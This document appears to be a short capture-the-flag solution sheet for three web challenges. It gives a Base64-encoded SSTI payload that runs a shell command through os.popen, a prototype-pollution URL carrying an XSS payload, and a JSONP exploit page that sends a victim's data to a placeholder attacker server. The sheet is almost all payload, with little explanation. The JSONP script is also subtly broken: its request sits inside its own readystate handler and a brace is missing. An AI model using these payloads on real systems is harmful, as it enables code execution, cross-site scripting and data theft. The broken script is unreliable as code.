## Challenge-1 (SSTI): 
Change **color** in cookie to this payload:

    e3sgc2VsZi5fX2luaXRfXy5fX2dsb2JhbHNfXy5fX2J1aWx0aW5zX18uX19pbXBvcnRfXygnb3MnKS5wb3BlbignaWQnKS5yZWFkKCkgfX0=

It is Base64 of this payload that makes SSTI to **RCE**

    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}


## Challenge-2 (Prototype Pollution): 

    https://pwn2pine-SERVER/2?__proto__[payload]=%3Cimg/src/onerror=alert()%3E&info=payload


## Challenge-3 (JSONP Vulnerability):

     <html>
     <body>
         <script>
             function MyFunc(data) {
             var xhttp = new XMLHttpRequest();
             xhttp.onreadystatechange = function() {
             xhttp.open("GET", "http://ATTACKER-SERVER?data=" + data, true);
             xhttp.send();
             }
         </script>
         <script src="https://pwn2pine-SERVER/jsonp?callback=MyFunc&id=admin"></script>
     </body>
     </html>
